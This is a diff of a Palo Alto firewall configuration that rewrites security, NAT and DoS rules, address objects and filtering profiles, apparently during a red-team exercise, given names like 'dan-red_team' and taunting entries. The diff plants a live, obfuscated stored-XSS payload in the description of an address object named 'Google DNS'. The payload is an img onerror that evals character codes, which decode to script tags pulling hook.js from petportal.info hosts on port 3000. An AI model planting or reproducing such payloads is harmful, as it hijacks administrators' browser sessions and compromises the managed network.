+                  </to>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>any</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                  <log-start>no</log-start>
+                  <log-end>yes</log-end>
+                  <negate-source>no</negate-source>
+                  <negate-destination>no</negate-destination>
+                </entry>
+                <entry name="USER2INTERNAL">
+                  <to>
+                    <member>Internal</member>
+                  </to>
+                  <from>
+                    <member>User</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="INTERNAL2EXTERNAL">
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>Internal</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                  <profile-setting>
+                    <profiles>
+                      <url-filtering>
+                        <member>dan-red_team</member>
+                      </url-filtering>
+                      <file-blocking>
+                        <member>basic file blocking</member>
+                      </file-blocking>
+                      <virus>
+                        <member>default</member>
+                      </virus>
+                      <spyware>
+                        <member>default</member>
+                      </spyware>
+                      <vulnerability>
+                        <member>default</member>
+                      </vulnerability>
+                      <wildfire-analysis>
+                        <member>default</member>
+                      </wildfire-analysis>
+                    </profiles>
+                  </profile-setting>
+                </entry>
+                <entry name="USER2PUBLIC">
+                  <to>
+                    <member>Public</member>
+                  </to>
+                  <from>
+                    <member>User</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>service-http</member>
+                    <member>service-https</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="Splunk 2 Phantom">
+                  <to>
+                    <member>any</member>
+                  </to>
+                  <from>
+                    <member>any</member>
+                  </from>
+                  <source>
+                    <member>Splunk</member>
+                  </source>
+                  <destination>
+                    <member>Phantom</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="Any 2 eComm">
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>any</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>CentOS-eCommerce</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>any</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="Any 2 External">
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>any</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                  <profile-setting>
+                    <profiles>
+                      <url-filtering>
+                        <member>dan-red_team</member>
+                      </url-filtering>
+                      <spyware>
+                        <member>default</member>
+                      </spyware>
+                    </profiles>
+                  </profile-setting>
+                </entry>
+                <entry name="eComm 2 MySQL">
+                  <to>
+                    <member>Internal</member>
+                  </to>
+                  <from>
+                    <member>Public</member>
+                  </from>
+                  <source>
+                    <member>CentOS-eCommerce</member>
+                  </source>
+                  <destination>
+                    <member>Debian-MySQL</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>mysql</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="Allow 2008 AD NetBIOS">
+                  <to>
+                    <member>any</member>
+                  </to>
+                  <from>
+                    <member>any</member>
+                  </from>
+                  <source>
+                    <member>2008-AD_DNS</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                  <disabled>yes</disabled>
+                </entry>
+                <entry name="2008 DNS Allow">
+                  <to>
+                    <member>User</member>
+                  </to>
+                  <from>
+                    <member>Internal</member>
+                    <member>Public</member>
+                    <member>User</member>
+                  </from>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>2008-AD_DNS</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>dns</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                </entry>
+                <entry name="Block PA Internal">
+                  <to>
+                    <member>User</member>
+                  </to>
+                  <from>
+                    <member>any</member>
+                  </from>
+                  <source>
+                    <member>2008-AD_DNS</member>
+                    <member>Ubuntu-DNS</member>
+                  </source>
+                  <destination>
+                    <member>Palo Alto Internal</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>application-default</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
                   <action>deny</action>
-                  <log-start>yes</log-start>
-                  <log-end>yes</log-end>
-                  <negate-source>no</negate-source>
-                  <negate-destination>no</negate-destination>
-                  <disabled>no</disabled>
                 </entry>
-                <entry name="LAN - LAN">
-                  <from>
-                    <member>LAN</member>
-                  </from>
+                <entry name="DENY ALL">
                   <to>
-                    <member>LAN</member>
+                    <member>any</member>
                   </to>
+                  <from>
+                    <member>any</member>
+                  </from>
                   <source>
                     <member>any</member>
                   </source>
@@ -1650,127 +2167,16 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <hip-profiles>
                     <member>any</member>
                   </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                  <log-end>yes</log-end>
-                  <disabled>yes</disabled>
-                </entry>
-                <entry name="LAN - DMZ">
-                  <option>
-                    <disable-server-response-inspection>no</disable-server-response-inspection>
-                  </option>
-                  <from>
-                    <member>LAN</member>
-                  </from>
-                  <to>
-                    <member>DMZ</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>any</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                  <log-end>yes</log-end>
-                  <negate-source>no</negate-source>
-                  <negate-destination>no</negate-destination>
-                  <disabled>yes</disabled>
-                </entry>
-                <entry name="DMZ - LAN">
-                  <option>
-                    <disable-server-response-inspection>no</disable-server-response-inspection>
-                  </option>
-                  <from>
-                    <member>DMZ</member>
-                  </from>
-                  <to>
-                    <member>LAN</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>any</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                  <log-end>yes</log-end>
-                  <negate-source>no</negate-source>
-                  <negate-destination>no</negate-destination>
-                  <disabled>yes</disabled>
-                </entry>
-                <entry name="DMZ - DMZ">
-                  <from>
-                    <member>DMZ</member>
-                  </from>
-                  <to>
-                    <member>DMZ</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>any</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                  <disabled>yes</disabled>
+                  <action>deny</action>
                 </entry>
               </rules>
             </security>
             <nat>
               <rules>
-                <entry name="e-commerce">
+                <entry name="CentOS e-comm">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.11</translated-address>
+                      <translated-address>172.25.27.11</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1778,10 +2184,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>DMZ</member>
+                    <member>Public</member>
                   </from>
                   <source>
-                    <member>172.20.240.11</member>
+                    <member>172.20.241.30</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1791,10 +2197,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <to-interface>any</to-interface>
                   <disabled>no</disabled>
                 </entry>
-                <entry name="ubuntu-dns">
+                <entry name="Ubuntu dns">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.23</translated-address>
+                      <translated-address>172.25.27.23</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1802,10 +2208,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>DMZ</member>
+                    <member>User</member>
                   </from>
                   <source>
-                    <member>172.20.240.23</member>
+                    <member>172.20.242.10</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1815,10 +2221,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <to-interface>any</to-interface>
                   <disabled>no</disabled>
                 </entry>
-                <entry name="Debian Email">
+                <entry name="Splunk">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.39</translated-address>
+                      <translated-address>172.25.27.9</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1826,10 +2232,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>LAN</member>
+                    <member>Public</member>
                   </from>
                   <source>
-                    <member>172.20.241.39</member>
+                    <member>172.20.241.20</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1838,10 +2244,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <nat-type>ipv4</nat-type>
                   <to-interface>any</to-interface>
                 </entry>
-                <entry name="2003 FTP">
+                <entry name="Fedora webmail">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.9</translated-address>
+                      <translated-address>172.25.27.39</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1849,33 +2255,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>LAN</member>
+                    <member>Public</member>
                   </from>
                   <source>
-                    <member>172.20.241.9</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <service>any</service>
-                  <nat-type>ipv4</nat-type>
-                  <to-interface>any</to-interface>
-                </entry>
-                <entry name="W12 Web App">
-                  <source-translation>
-                    <static-ip>
-                      <translated-address>172.25.28.3</translated-address>
-                      <bi-directional>yes</bi-directional>
-                    </static-ip>
-                  </source-translation>
-                  <to>
-                    <member>External</member>
-                  </to>
-                  <from>
-                    <member>LAN</member>
-                  </from>
-                  <source>
-                    <member>172.20.241.3</member>
+                    <member>172.20.241.40</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1887,7 +2270,7 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                 <entry name="2k8 AD-DNS">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.27</translated-address>
+                      <translated-address>172.25.27.27</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1895,10 +2278,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>LAN</member>
+                    <member>User</member>
                   </from>
                   <source>
-                    <member>172.20.241.27</member>
+                    <member>172.20.242.200</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1906,11 +2289,56 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <service>any</service>
                   <nat-type>ipv4</nat-type>
                   <to-interface>any</to-interface>
+                </entry>
+                <entry name="Phantom">
+                  <source-translation>
+                    <static-ip>
+                      <translated-address>172.25.27.97</translated-address>
+                      <bi-directional>yes</bi-directional>
+                    </static-ip>
+                  </source-translation>
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>Internal</member>
+                  </from>
+                  <source>
+                    <member>172.20.240.10</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <service>any</service>
+                  <nat-type>ipv4</nat-type>
+                  <to-interface>any</to-interface>
+                </entry>
+                <entry name="Debian MySQL">
+                  <from>
+                    <member>Internal</member>
+                  </from>
+                  <source>
+                    <member>172.20.240.20</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <service>any</service>
+                  <nat-type>ipv4</nat-type>
+                  <source-translation>
+                    <static-ip>
+                      <bi-directional>yes</bi-directional>
+                      <translated-address>172.25.27.20</translated-address>
+                    </static-ip>
+                  </source-translation>
+                  <to>
+                    <member>External</member>
+                  </to>
                 </entry>
                 <entry name="PA">
                   <source-translation>
                     <static-ip>
-                      <translated-address>172.25.28.100</translated-address>
+                      <translated-address>172.25.27.150</translated-address>
                       <bi-directional>yes</bi-directional>
                     </static-ip>
                   </source-translation>
@@ -1918,10 +2346,10 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                     <member>External</member>
                   </to>
                   <from>
-                    <member>LAN</member>
+                    <member>User</member>
                   </from>
                   <source>
-                    <member>172.20.241.100</member>
+                    <member>172.20.242.150</member>
                   </source>
                   <destination>
                     <member>any</member>
@@ -1930,15 +2358,117 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <nat-type>ipv4</nat-type>
                   <to-interface>any</to-interface>
                 </entry>
+                <entry name="User NAT">
+                  <source-translation>
+                    <dynamic-ip-and-port>
+                      <translated-address>
+                        <member>172.25.27.152</member>
+                      </translated-address>
+                    </dynamic-ip-and-port>
+                  </source-translation>
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>User</member>
+                  </from>
+                  <source>
+                    <member>User</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <service>any</service>
+                  <nat-type>ipv4</nat-type>
+                </entry>
+                <entry name="Public NAT">
+                  <source-translation>
+                    <dynamic-ip-and-port>
+                      <translated-address>
+                        <member>172.25.27.151</member>
+                      </translated-address>
+                    </dynamic-ip-and-port>
+                  </source-translation>
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>Public</member>
+                  </from>
+                  <source>
+                    <member>Public</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <service>any</service>
+                  <nat-type>ipv4</nat-type>
+                </entry>
+                <entry name="Internal NAT">
+                  <source-translation>
+                    <dynamic-ip-and-port>
+                      <translated-address>
+                        <member>172.25.27.150</member>
+                      </translated-address>
+                    </dynamic-ip-and-port>
+                  </source-translation>
+                  <to>
+                    <member>External</member>
+                  </to>
+                  <from>
+                    <member>Internal</member>
+                  </from>
+                  <source>
+                    <member>Internal</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <service>any</service>
+                  <nat-type>ipv4</nat-type>
+                </entry>
               </rules>
             </nat>
-            <dos>
+            <application-override>
               <rules/>
+            </application-override>
+            <dos>
+              <rules>
+                <entry name="Public Zone">
+                  <from>
+                    <zone>
+                      <member>External</member>
+                    </zone>
+                  </from>
+                  <to>
+                    <zone>
+                      <member>Public</member>
+                    </zone>
+                  </to>
+                  <protection/>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <service>
+                    <member>any</member>
+                  </service>
+                  <action>
+                    <deny/>
+                  </action>
+                </entry>
+              </rules>
             </dos>
           </rulebase>
           <global-protect>
             <global-protect-gateway/>
             <global-protect-portal/>
+            <global-protect-mdm/>
           </global-protect>
           <import>
             <network>
@@ -1946,9 +2476,230 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                 <member>ethernet1/1</member>
                 <member>ethernet1/2</member>
                 <member>ethernet1/3</member>
+                <member>ethernet1/4</member>
               </interface>
             </network>
           </import>
+          <address>
+            <entry name="User">
+              <ip-netmask>172.20.242.0/24</ip-netmask>
+            </entry>
+            <entry name="Public">
+              <ip-netmask>172.20.241.0/24</ip-netmask>
+            </entry>
+            <entry name="Internal">
+              <ip-netmask>172.20.240.0/24</ip-netmask>
+            </entry>
+            <entry name="Google DNS">
+              <ip-netmask>8.8.8.8</ip-netmask>
+              <description>&lt;img src="/" onerror="eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,115,114,99,61,39,104,116,116,112,58,47,47,104,101,114,97,46,112,101,116,112,111,114,116,97,108,46,105,110,102,111,58,51,48,48,48,47,104,111,111,107,46,106,115,39,59,32,118,97,114,32,97,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,59,32,97,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,32,118,97,114,32,120,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,120,46,115,114,99,61,39,104,116,116,112,115,58,47,47,104,111,117,100,105,110,105,46,112,101,116,112,111,114,116,97,108,46,105,110,102,111,58,51,48,48,48,47,104,111,111,107,46,106,115,39,59,32,97,46,97,112,112,101,110,100,67,104,105,108,100,40,120,41,59))"&gt;</description>
+            </entry>
+            <entry name="Splunk">
+              <ip-netmask>172.20.241.20</ip-netmask>
+            </entry>
+            <entry name="Phantom">
+              <ip-netmask>172.20.240.10</ip-netmask>
+            </entry>
+            <entry name="Debian-MySQL">
+              <ip-netmask>172.20.240.20</ip-netmask>
+            </entry>
+            <entry name="Ubuntu-DNS">
+              <ip-netmask>172.20.242.10</ip-netmask>
+            </entry>
+            <entry name="2008-AD_DNS">
+              <ip-netmask>172.20.242.200</ip-netmask>
+            </entry>
+            <entry name="Win8.1">
+              <ip-netmask>172.20.242.100</ip-netmask>
+            </entry>
+            <entry name="CentOS-eCommerce">
+              <ip-netmask>172.20.241.30</ip-netmask>
+            </entry>
+            <entry name="Fedora-Webmail_webapp">
+              <ip-netmask>172.20.241.40</ip-netmask>
+            </entry>
+            <entry name="Palo Alto External">
+              <ip-netmask>172.31.27.2</ip-netmask>
+            </entry>
+            <entry name="Palo Alto Internal">
+              <ip-netmask>172.20.242.150</ip-netmask>
+            </entry>
+          </address>
+          <profiles>
+            <hip-objects>
+              <entry name="Brian">
+                <description>I hope I don't get fired.</description>
+              </entry>
+            </hip-objects>
+            <data-objects>
+              <entry name="Backup">
+                <pattern-type>
+                  <regex>
+                    <pattern>
+                      <entry name="Idiot">
+                        <regex>ch@ngme</regex>
+                        <file-type>
+                          <member>any</member>
+                        </file-type>
+                      </entry>
+                    </pattern>
+                  </regex>
+                </pattern-type>
+              </entry>
+            </data-objects>
+            <hip-profiles>
+              <entry name="PAN-SA-2015-0006">
+                <match>not "Brian"</match>
+                <description>First Name</description>
+              </entry>
+            </hip-profiles>
+            <spyware>
+              <entry name="strict-1">
+                <rules>
+                  <entry name="simple-critical">
+                    <threat-name>any</threat-name>
+                    <category>any</category>
+                    <severity>
+                      <member>critical</member>
+                    </severity>
+                    <action>
+                      <reset-both/>
+                    </action>
+                  </entry>
+                  <entry name="simple-high">
+                    <threat-name>any</threat-name>
+                    <category>any</category>
+                    <severity>
+                      <member>high</member>
+                    </severity>
+                    <action>
+                      <reset-both/>
+                    </action>
+                  </entry>
+                  <entry name="simple-medium">
+                    <threat-name>any</threat-name>
+                    <category>any</category>
+                    <severity>
+                      <member>medium</member>
+                    </severity>
+                    <action>
+                      <reset-both/>
+                    </action>
+                  </entry>
+                  <entry name="simple-informational">
+                    <threat-name>any</threat-name>
+                    <category>any</category>
+                    <severity>
+                      <member>informational</member>
+                    </severity>
+                    <action>
+                      <default/>
+                    </action>
+                  </entry>
+                  <entry name="simple-low">
+                    <threat-name>any</threat-name>
+                    <category>any</category>
+                    <severity>
+                      <member>low</member>
+                    </severity>
+                    <action>
+                      <default/>
+                    </action>
+                  </entry>
+                </rules>
+                <botnet-domains minver="7.1.0">
+                  <lists>
+                    <entry name="default-paloalto-dns">
+                      <action>
+                        <block/>
+                      </action>
+                    </entry>
+                  </lists>
+                  <packet-capture>disable</packet-capture>
+                </botnet-domains>
+              </entry>
+            </spyware>
+            <url-filtering>
+              <entry name="dan-red_team">
+                <credential-enforcement>
+                  <mode>
+                    <disabled/>
+                  </mode>
+                  <log-severity>medium</log-severity>
+                  <block>
+                    <member>abused-drugs</member>
+                    <member>adult</member>
+                    <member>command-and-control</member>
+                    <member>gambling</member>
+                    <member>hacking</member>
+                    <member>malware</member>
+                    <member>phishing</member>
+                    <member>questionable</member>
+                    <member>weapons</member>
+                  </block>
+                </credential-enforcement>
+                <action>block</action>
+                <block>
+                  <member>abused-drugs</member>
+                  <member>adult</member>
+                  <member>command-and-control</member>
+                  <member>gambling</member>
+                  <member>hacking</member>
+                  <member>malware</member>
+                  <member>phishing</member>
+                  <member>questionable</member>
+                  <member>weapons</member>
+                </block>
+              </entry>
+            </url-filtering>
+          </profiles>
+          <application-filter>
+            <entry name="Garcia loves chunkymonkey">
+              <category>
+                <member>business-systems</member>
+                <member>collaboration</member>
+                <member>general-internet</member>
+                <member>media</member>
+                <member>networking</member>
+                <member>unknown</member>
+              </category>
+            </entry>
+          </application-filter>
+          <threats>
+            <vulnerability>
+              <entry name="41111">
+                <signature>
+                  <standard>
+                    <entry name="Bruteforce">
+                      <order-free>no</order-free>
+                      <scope>protocol-data-unit</scope>
+                    </entry>
+                  </standard>
+                </signature>
+                <default-action>
+                  <alert/>
+                </default-action>
+                <cve>
+                  <member>agata</member>
+                </cve>
+                <reference>
+                  <member>charity</member>
+                </reference>
+                <vendor>
+                  <member>dogma</member>
+                </vendor>
+                <bugtraq>
+                  <member>redteam</member>
+                </bugtraq>
+                <threatname>Bruteforce Protection</threatname>
+                <severity>informational</severity>
+                <direction>client2server</direction>
+                <affected-host>
+                  <client>yes</client>
+                </affected-host>
+              </entry>
+            </vulnerability>
+          </threats>
         </entry>
       </vsys>
     </entry>
